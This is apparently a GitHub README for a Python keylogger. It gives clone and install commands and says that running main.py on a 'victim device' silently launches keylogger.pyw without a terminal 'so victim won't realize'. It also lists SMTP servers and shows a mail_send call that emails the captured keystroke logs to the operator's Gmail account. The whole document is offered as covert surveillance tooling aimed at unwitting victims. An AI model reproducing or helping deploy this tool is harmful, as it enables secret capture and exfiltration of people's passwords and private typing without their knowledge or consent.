# Keylogger

## Install 

    git clone https://github.com/OldKokoroz/Keylogger.git
    pip install pynput
    

## Setup

To try on your device run Keylogger.py 

to run on your victim device run main.py it will install requirements and 
automatically run keylogger.pyw (without a terminal) so victim won't realize 


## Getting log file 

| Server Name |  SMTP Server 	        | SMTP Port  |
| ----------- |  ---------------------  | ---------  |
| GMAIL 	  |  smtp.gmail.com 	    |  587       | 
| OUTLOOK 	  |  smtp-mail.outlook.com  |  587       | 
| YAHOO 	  |  smtp.mail.yahoo.com 	|  587       | 


You have to :

- open a new gmail account

         mail_send("your-email@gmail.com", "your-passwd", log_msg)  ---- Do not touch log_msg

- enter your address instead of first ""

- enter your password instead of second ""

- It is set to send mails to the mail you give (that means you send logs to yourself with your account)
